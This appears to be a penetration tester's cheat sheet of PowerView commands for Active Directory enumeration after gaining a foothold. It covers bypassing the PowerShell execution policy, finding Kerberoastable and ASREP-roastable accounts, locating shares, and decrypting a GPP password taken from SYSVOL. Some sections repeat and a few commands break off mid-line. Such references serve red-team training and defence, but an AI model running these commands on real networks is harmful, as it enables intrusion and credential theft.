## PowerView.ps1 
```
Post Compromise Enumeration
Once we have gained access in a machine from the network

    Gather info using powerview
    Map the AD environment by using bloodhound

PowerView.ps1
First bypass powershell execution policy and then import powerview
    powershell -ep bypass
    . .\Powerview.ps1

Get-DomainUser is used for whole domain and Get-NetUser for current Computer on which we have foothold
domain info:
    Get-NetDomain

Displays Domain controllers info:
    Get-NetDomainController

Get list of Network info:
    Get-NetIPAddress

Domain policy:
    Get-DomainPolicy

We will get few objects and we can view detailed info by following command.for eg if we get some info about system access object ,we will insert the object name in below command
    (Get-DomainPolicy."above command output")

See open ports
    Get-NetTCPConnection | where-Object -Property State -match listen

Get Computer information in domain
    Get-NetComputer -fulldata

to get only OS on computers
    Get-NetComputer -fulldata | select operatingsystem

Get list of users on local machine
    Get-LocalUser

Get list of Users on domain
    Get-NetUser

To view only usernames
    Get-NetUser | select cn

Detecting Honeypots in the networks
    Get-UserProperty -Properties logoncount

Seeing which account has multiple retries in authetntication
    Get-UserProperty -Properties badpwdcount

Get all groupsname on domain
    Get-NetGroup -GroupName *

Get local groups of current machine
    Get-NetLocalGroup SERVER.domain.local

Get Service accounts passwords and info
    Get-NetUser -SPN

Or to get info about service account of specific group
    Get-NetUser -SPN | ?{$_.memberof -match 'GroupName'}
    Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
    get-adobject | Where-Object {$.serviceprincipalname -ne $null -and $.distinguishedname -like "CN=Users" -and $_.cn -ne "krbtgt"}

See recently applied patches
    Get-HOtfix

Find available shares
    Invoke-ShareFinder


PowerView.ps1
PS C:\Tools> Import-Module .\PowerView.ps1 or . .\PowerView.ps1 

Get-NetDomain
Get-NetUser
Get-NetUser | select cn  <-- The cn attribute holds the username of the user. Pipe the output into select and choose the cn attribute
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Find-LocalAdminAccess
Find-DomainShare

SPNs
SPNs via PowerView.ps1
Another way of enumerating SPNs is to let PowerView enumerate all the accounts in the domain. 
Obtain a clear list of SPNs by piping the output into select and choose the samaccountname and serviceprincipalname attributes:
Get-NetUser -SPN | select samaccountname,serviceprincipalname

Shares
Find-DomainShare  <-- use PowerView's Find-DomainShare function to find the shares in the domain. 
By default, the SYSVOL folder is mapped to %SystemRoot%\SYSVOL\Sysvol\domain-name on the domain controller and every domain user has access to it.
ls \\FILES04\docshare
ls \\dc1.site.com\sysvol\corp.com\
ls \\dc1.site.com\sysvol\corp.com\Policies\
cat \\dc1.site.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml  <-- Maybe you can find some old backup xml files.
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"   <-- Gpp-decrypt any encrypted strings you find in shares. 

Basic Domain Information
Get-NetDomain

User Information
Get-NetUser
Get-NetUser | select samaccountname, description, logoncount
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount
Get-NetUser -LDAPFilter '(sidHistory=*)'
Get-NetUser -PreauthNotRequired
Get-NetUser -SPN

Groups Information
Get-NetGroup | select samaccountname,description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName

Computers Information  
Get-NetComputer | select operatingsystem,dnshostname
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrained | select samaccountname 
Get-NetComputer -TrustedToAuth | select samaccountname
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*

Domain Info
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID
​
Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."System Access" #Password policy
(Get-DomainPolicy).PrivilegeRights #Check your privileges
​
Domain Controller
Get-NetDomainController -Domain mydomain.local #Get Domain Controller# Domain Info
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID
​
Users, Groups and Computers
Users
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select -ExpandProperty samaccountname #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter

User Information
Get-NetUser
Get-NetUser | select samaccountname, description, logoncount
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount
Get-NetUser -LDAPFilter '(sidHistory=*)'
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
​
Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth #Useful for Kerberos constrain delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation

Groups
Get-NetGroup | select samaccountname,description
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount #Search admin groups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-NetGPOGroup #Get restricted groups
​
DNS Hostname
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*

Logons and Sessions
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)

Shared Files and Folders
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters

GPOs & OUs
GPO
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}

ACL
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs #Get ACLs of an object (permissions of other objects over the indicated one)
Get-PathAcl -Path "\\dc.mydomain.local\sysvol" #Get permissions of a file
Find-InterestingDomainAcl -ResolveGUIDs #Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"} #Check if any of the interesting permissions founds is realated to a username/group
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights #Get special rights over All administrators in domain

Domain Trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts
​Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)" 
​Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)
​Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
